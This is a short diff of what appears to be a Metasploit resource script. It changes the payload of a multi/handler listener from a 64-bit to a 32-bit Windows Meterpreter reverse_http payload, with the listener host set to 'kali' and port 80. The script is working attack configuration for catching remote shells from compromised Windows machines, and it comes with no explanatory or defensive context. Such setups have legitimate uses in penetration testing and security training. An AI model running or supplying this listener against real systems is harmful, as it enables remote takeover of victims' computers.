@@ -1,5 +1,5 @@
 use exploit/multi/handler
-set PAYLOAD windows/x64/meterpreter/reverse_http
+set PAYLOAD windows/meterpreter/reverse_http
 set EXITFUNC thread
 set LHOST kali
 set LPORT 80
